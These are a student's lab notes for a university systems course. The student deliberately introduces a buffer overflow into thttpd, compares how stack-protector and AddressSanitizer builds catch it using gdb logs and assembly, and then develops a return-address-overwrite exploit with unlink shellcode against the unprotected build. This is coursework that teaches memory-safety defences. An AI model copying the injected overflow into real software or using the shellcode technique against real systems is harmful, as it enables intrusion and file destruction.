-- 'SMASHING LAB' and the Stack -- Kevin Vu -- CS33 -- Lu, Y. 
		|			|	-- Former stack frames
		-------------		
		|	RET		|
		-------------
		|	...		| 	-- Saved Registers (by push)
		-------------
		|	SENTINEL|
		|	CANARY	|
		-------------
		|			|
		|	STACK	|
		------------- 	<-- rsp
'[1]: SET-UP'
- Log onto lnxsrv09.seas.ucla.edu & make sure /usr/local/cs/bin is at the start of my PATH // which gcc should output "/usr/local/cs/bin/gcc"
- Configure:
./configure \
 LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc
-dumpversion)/lib"
- PATCHING thttpd (Setting up for potential exploit later):
	+ Replacing char line[10k] with char line [100]
	+ Replacing the while loop inside read_config to read up to 1000 lines instead of the sizeof(line)
[2]: Compile it three times to make an SP, AS, NO versions of the file: 
		(SP) for strong stack protection:
			make clean
			make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
			mv src/thttpd src/thttpd-sp
		(AS) for address sanitization:
			make clean
			make CFLAGS='-g3 -O2 -fno-inline -fsanitize=address'
			make CFLAGS='-g3 -O2 -fno-inline -static-libasan -fsanitize=address'
			mv src/thttpd src/thttpd-as
		(NO) for neither:
			make clean
			make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
			mv src/thttpd src/thttpd-no
[3]: Invoking the Server: // curl http://localhost:12652/config.txt to make sure it works
Use: * gdb ./src/thttpd-?? where ?? is sp/as/no
	* run -p XXXXX -D -C config.txt where XXXXX is 12652,12653, or 12654 (configno.txt for no)
	* backtrace
'[3]: Running thttpd with a file geared to make it smash 
(I) ./src/thttpd-sp -p 12652 -D -C config.txt // #5. Smash via Stack Protection 
	Crash Log:
		(gdb) run -p 12652 -D -C config.txt
		*** stack smashing detected ***: /w/home.04/ce/ugrad/hoai/sthttpd-2.27.0/src/thttpd-sp terminated
		Program received signal SIGSEGV, Segmentation fault.
		0x00007ffff6db1128 in ?? () from /lib64/libgcc_s.so.1
		The crash occurs because a length of more than 100 was loaded via config.txt and as a result the program crashes on a buffer overflow basis // You should get a smashing error line if your config file is set right.
	GDB:
		(gdb) backtrace
		#0  0x00007ffff6db1128 in ?? () from /lib64/libgcc_s.so.1
		#1  0x00007ffff6db2029 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
		#2  0x00007ffff76e50a6 in backtrace () from /lib64/libc.so.6
		#3  0x00007ffff7650e24 in __libc_message () from /lib64/libc.so.6
		#4  0x00007ffff76e8a57 in __fortify_fail () from /lib64/libc.so.6
		#5  0x00007ffff76e8a20 in __stack_chk_fail () from /lib64/libc.so.6
		#6  0x0000000000405042 in read_config (filename=<optimized out>) at thttpd.c:1190 // Notice this!
		#7  0x39393d74726f7039 in ?? () // This just means the address isn't valid or doesn't contain executable instructions
		(gdb) break thttpd.c:1190
		(gdb) set disassemble-next-line on
		(gdb) kill
		(gdb) run -p 12652 -D -C config.txt
		Starting program: /w/home.04/ce/ugrad/hoai/sthttpd-2.27.0/src/thttpd-sp -p 12652 -D -C config.txt
		Breakpoint 1, read_config (filename=<optimized out>) at thttpd.c:1190
		(gdb) si **From here si a couple of times until you reach ...
   		0x0000000000404f14 <read_config+1236>:       64 48 33 04 25 28 00 00 00      xor    %fs:0x28,%rax // IMPORTANT MACHINE CODE
		=> 0x0000000000404f1d <read_config+1245>:       0f 85 1a 01 00 00       jne    0x40503d <read_config+1533> 
		=> 0x000000000040503d <read_config+1533>:       e8 6e d4 ff ff  callq  0x4024b0 <__stack_chk_fail@plt>
		=> 0x00000000004024b0 <__stack_chk_fail@plt+0>: ff 25 42 2c 21 00       jmpq   *0x212c42(%rip)        # 0x61     50f8 <__stack_chk_fail@got.plt>
	The config.txt file encompasses line[100] of the stack portion. My config.txt consists of a character length of more than 100 characters. When the config file is passed as an argument into read_config, a buffer overflow will occur, effectively overwriting the sentinel. The stack protection sp component is implemented with sentinels, so this corresponds to the assembly lines read_config offset 1236 in which an xor is made with the sentinel, and if it does not equal, it jumps to a stack failure/smash (read_config offset 1245) to combat any potential harm from an attacker. The jump lands on the instuction to call stack check failure.
(II) ./src/thttpd-as -p 12653 -D -C config.txt // #6. Smash via Address Sanitize
	Crash Log:
		==16525==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffe1a33c44 at pc 0x00000045a418 bp 0x7fffe1a33ba0 sp 0x7fffe1a33350
		READ of size 163 at 0x7fffe1a33c44 thread T0
		    #0 0x45a417 in __interceptor_strchr ../../../../gcc-5.2.0/libsanitizer/asan/asan_interceptors.cc:430
		    #1 0x4b1e00 in read_config /w/home.04/ce/ugrad/hoai/sthttpd-2.27.0/src/thttpd.c:1018
		    #2 0x4b290e in parse_args /w/home.04/ce/ugrad/hoai/sthttpd-2.27.0/src/thttpd.c:893
		    #3 0x4082c7 in main /w/home.04/ce/ugrad/hoai/sthttpd-2.27.0/src/thttpd.c:380
		    #4 0x7f769a07baf4 in __libc_start_main (/lib64/libc.so.6+0x21af4)
		    #5 0x409354  (/w/home.04/ce/ugrad/hoai/sthttpd-2.27.0/src/thttpd-as+0x409354)
		Address 0x7fffe1a33c44 is located in stack of thread T0 at offset 132 in frame
		    #0 0x4b1d4f in read_config /w/home.04/ce/ugrad/hoai/sthttpd-2.27.0/src/thttpd.c:1000
		  This frame has 1 object(s):
		    [32, 132) 'line' <== Memory access at offset 132 overflows this variable // IMPORTANT
		SUMMARY: AddressSanitizer: stack-buffer-overflow ../../../../gcc-5.2.0/libsanitizer/asan/asan_interceptors.cc:430 __interceptor_strchr
		Shadow bytes around the buggy address:
		  0x10007c33e730: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
		  0x10007c33e740: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
		  0x10007c33e750: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
		  0x10007c33e760: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
		  0x10007c33e770: 00 00 00 00 00 00 00 00 f1 f1 f1 f1 00 00 00 00
		=>0x10007c33e780: 00 00 00 00 00 00 00 00[04]f4 f4 f4 f3 f3 f3 f3
		  0x10007c33e790: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
		  0x10007c33e7a0: f1 f1 f1 f1 04 f4 f4 f4 f2 f2 f2 f2 04 f4 f4 f4
		  0x10007c33e7b0: f2 f2 f2 f2 00 00 f4 f4 f2 f2 f2 f2 00 00 00 00
		  0x10007c33e7c0: 00 00 00 00 00 00 00 00 00 00 00 00 f2 f2 f2 f2
		  0x10007c33e7d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
		Shadow byte legend (one shadow byte represents 8 application bytes):
		  Addressable:           00
		  Partially addressable: 01 02 03 04 05 06 07
		  Heap left redzone:       fa
		  Heap right redzone:      fb
		  Freed heap region:       fd
		  Stack left redzone:      f1
		  Stack mid redzone:       f2
		  Stack right redzone:     f3
		  Stack partial redzone:   f4
		  Stack after return:      f5
		  Stack use after scope:   f8
		  Global redzone:          f9
		  Global init order:       f6
		  Poisoned by user:        f7
		  Container overflow:      fc
		  Array cookie:            ac
		  Intra object redzone:    bb
		  ASan internal:           fe
		==16525==ABORTING
			*****What is important to note in the crash log is:[32, 132) 'line' <== Memory access at offset 132 overflows this variable. 
			This informs the user that the content length of config.txt is more than 100 and thus the input has overflowed line[100]
	GDB: 
		backtrace
		#0  0x00007ffff7073128 in ?? () from /lib64/libgcc_s.so.1
		#1  0x00007ffff7074029 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
		#2  0x000000000048a416 in __sanitizer::BufferedStackTrace::SlowUnwindStack (
		    this=0x7fffffffbdc0, pc=4563992, max_depth=<optimized out>)
		    at ../../../../gcc-5.2.0/libsanitizer/sanitizer_common/sanitizer_unwind_posix_libcdep.cc:113
		#3  0x0000000000486892 in __asan::GetStackTraceWithPcBpAndContext (fast=false,
		    context=0x0, bp=140737488342656, pc=<optimized out>, max_depth=256,
		    stack=<optimized out>)
		    at ../../../../gcc-5.2.0/libsanitizer/asan/asan_stack.h:43
		#4  __asan_report_error (pc=<optimized out>, bp=bp@entry=140737488342656,
		    sp=sp@entry=140737488340528, addr=addr@entry=140737488342820,
		    is_write=is_write@entry=0, access_size=access_size@entry=649)
		    at ../../../../gcc-5.2.0/libsanitizer/asan/asan_report.cc:1006
		#5  0x000000000045a433 in __interceptor_strchr (
		    str=str@entry=0x7fffffffcec0 "port=9999port=9999port=9999port=9999port=9999port=9999port=9999port=9999port=9999port=9999port=9999port=9999port=9999port=9999port=9999port=9999port=9999port=9999port=9999port=9999port=9999port=9999po"..., c=c@entry=35)
		    at ../../../../gcc-5.2.0/libsanitizer/asan/asan_interceptors.cc:430
		#6  0x00000000004b1e01 in read_config (filename=<optimized out>)
		    at thttpd.c:1018
		(gdb) break thttpd.c:1018
		(gdb) set disassemble-next-line on
		(gdb) kill
		(gdb) run -p 12653 -D -C config.txt // IMPORTANT MACHINE CODE BELOW THAT CAUSED CRASH
		0x000000000045a402 <__interceptor_strchr(char const*, int)+194>:     e8 19 84 02 00  callq  0x482820 <__asan_region_is_poisoned(__san     itizer::uptr, __sanitizer::uptr)>
		0x000000000045a42e <__interceptor_strchr(char const*, int)+238>:     e8 3d c1 02 00  callq  0x486570 <__asan_report_error(__saniti   zer::uptr, __sanitizer::uptr, __sanitizer::uptr, __sanitizer::uptr, int, __sanitizer::uptr)>
		0x0000000000482820 <__asan_region_is_poisoned(__sanitizer::uptr, __sanitizer::uptr)+0>:      48 85 f6        test   %rsi,%rsi
	The instructions that ultimately led to the crash are at <__interceptor_strchr(char const*, int)+194> and <__interceptor_strchr(char const*, int)+238>. Both use callq. The two instructions together check config.txt which was passed in and because I overloaded my config.txt file with more than 100, the "vector" of memory with respect to config.txt is then marked to be poisoned and error reports will be printed. If my config file is large enough, I can reach the return address as well. Address Sanitizer, in general, stores into shadow memory as a method to detect poisoned areas and report back to the user.
(III) ./src/thttpd-no -p 12654 -D -C configno.txt // #7. Smash via No (Notice configno.txt!)
	Crash Log:
		Program received signal SIGSEGV, Segmentation fault.
		0x0000000000404d8b in read_config (filename=<optimized out>) at thttpd.c:1190 
	GDB:
		backtrace
		(gdb) bt
			#0  0x0000000000404d8b in read_config (filename=<optimized out>) // here causes
			    at thttpd.c:1190
			#1  0x6161616161616161 in ?? ()// All the way to #13
			#14 0x0000616161616161 in ?? ()
			#15 0x0000000000000000 in ?? ()
	The instruction here is ret which caused the segmentation fault. The RET had been overrided in the stack.
	In this case, 0x61616161... was the changed address. This address was not a valid address (if we are unlucky it could be). This is why the console outputs 'segmentation fault' instead of continuing to execute
#8.	(SP) for strong stack protection: // Making assembly code .s files
	make clean
	make CFLAGS='-S -O2 -fno-inline -fstack-protector-strong'
	mv src/thttpd.o src/thttpd-sp.s
	(AS) for address sanitization:
	make clean
	make CFLAGS='-S -O2 -fno-inline -static-libasan -fsanitize=address'
	mv src/thttpd.o src/thttpd-as.s
	(NO) for neither:
	make clean
	make CFLAGS='-S -O2 -fno-inline -fno-stack-protector -zexecstack'
Make diff files or use diffchecker.com (I used the latter)
"Comparison between SP, AS, NO": SP and AS are somewhat similar with few differences (and obvious differences in Labels). SP and NO are essentially the same, which at first I thought was weird, but it's actually because SP only protects the stack so it does not deviate far from NO. Lastly, AS and NO are extremely different in their approaches and this was what I expected.
Describe the techniques used by -fstack-protector-strong and -fsanitize=address to prevent buffer-overrun exploits in handle_read.:
The techniques used by the stack protection to prevent buffer overrun exploits are sentinels that are bytes placed before and checked after calls. If the sentinels have changed, it will instruct a crash to prevent attackers. There is a possiblity that an attacker can guess the sentinel though. However, SP implements this by pushing an immediate below the return address and checking it prior to the return of the function. For example, if we deviate and look at handle_send, we will see the use of a sentinel (similar to the gdb log in stack protection):
	movq	%fs:40, %rax 
	movq	%rax, 40(%rsp) // MEM[rsp+40] = rax
	..........................
	movq	40(%rsp), %rax // rax = MEM[rsp + 40] 
	xorq	%fs:40, %rax  // fs is a segment register 
	jne	.L507 // If not equal, jump 
Meanwhile, the techniques used by address sanitize to prevent buffer-overrun exploits are poisons and shadow memory. When dealing with memory allocation, AS will place 'poison area' all around and then stored to shadow memory. This method, in turn, will allow for procedural checks of poison whenever memory is accessed on the machine level. If that is the case of poison, the program will exit. In a high level perspective, address sanitize will use shadow memory mapping to determine if a byte of memory is ok to utilize. Address sanitize uses a portion of the virtual address space to shadow memory. A shadow byte is computed as (Address >> 3) + some offset. Looking at the handle_read, you will notice that there are periodic "shrq	$3, %rax" followed by movzbl which moves a byte to a long. This is then checked by conditionals such as je and if it is true to be 'poisoned', it will jump to report the overflow. Looking at handle_read, this contains a form of sentinel use.
Lastly, for no, there is no protection.
#9. // Designing an Expoit via Unlink method:
	- Step 01: Find the address of the start of the buffer and the RET address
		+ Do this via GDB. Set a break point at read_config after running gdb ./src/thttpd-no with run -p 12654 -D -C config.txt
		+ break read_config, then s and si until you get to the return address of read_config at offset
		+ RET ADDRESS: 0x7fffffffd0b8 (where rsp points at ret) | BUFFER ADDRESS: 0x7fffffffd020 (Found by break read_config & run -p 12654 -D -C config.txt & p&line) 
		+ OFFSET B/T BUFFER ADDRESS and RETURN ADDRESS: 0x7fffffffd0b8 - 0x7fffffffd020 = (0x98)16 = 152. As a result, we need this much filler to prop up before reaching the RET 
	- Step 02: Syscall will call "unlink" when the return register rax is 0x57. Therefore, I made a .s extension to write in the machine code. .s -> .o -> objdump to unveil the machine instruction's bits.' We need rax to be 0x57, so we do that.
		+ emacs machineinstructions.s (or use Notepad++ and save as .s)
			mov $0x57, %rax
			mov $0x7FFFFFFFD025, %rdi // $0x7FFFFFFFD025 is the address of target.txt, find it by (gdb) run -p 12654 -D -C ./src/exploit.txt, x/20cb 0x7fffffffd020 (address of buffer), then examining until you reach 't'
			syscall
		+ gcc -c machineinstructions.s 
		+ objdump -c ./src/machineinstructions.o
		+	Disassembly of section .text:
			0000000000000000 <.text>:
			   0:   48 c7 c0 57 00 00 00    mov    $0x57,%rax // 0x57 the value that needs to be in rax for syscall to unlink
			   7:   48 bf 25 d0 ff ff ff    movabs $0x7FFFFFFFD025,%rdi // The address of target.txt
			   e:   7f 00 00
			  11:   0f 05                   syscall
	- Step 03: In exploit.txt, I need to convert the text to hex, so I used an online converter. For the return address [which is 8 bytes long], the plan is to just return to the end of the return instruction. Therefore, the return instruction should map to 0x8 offset of where it starts. 0xB8 + 0x8 = 0xC0 and thus we return to 0x7fffffffd0c0
	- Step 04: 0x7fffffffd0c0 where we return to is where we can start the "no-op sled" for assurance we will be able to use syscall, rdi holding the address of target.txt, and rax holding 0x57 to specify "unlink". The "no-op sled" is not that necessary however.
	- Step 05: hex.txt in terms of hex bytes, then, will be "port=target.txt\0" + "Garbage up until it equals 152 offset" + "Return to the end of Ret" + "NoOps" + "machineinstructions bytes that we made"
	- Step 06: Convert your hex to raw via Reimans Hex2Raw utility: "chmod 0777 ./src/hex2raw" to change permissions, then cat ./src/hex.txt | ./src/hex2raw > ./src/exploit.txt --> This creates a exploit.txt file in an 'interesting' format readable by read_config.
	- Step 07: Testing: gdb ./src/thttpd-no | run -p 12654 -D -C ./src/foolproofexploit.txt. Is target.txt deleting from thttpd2.27.0 ?
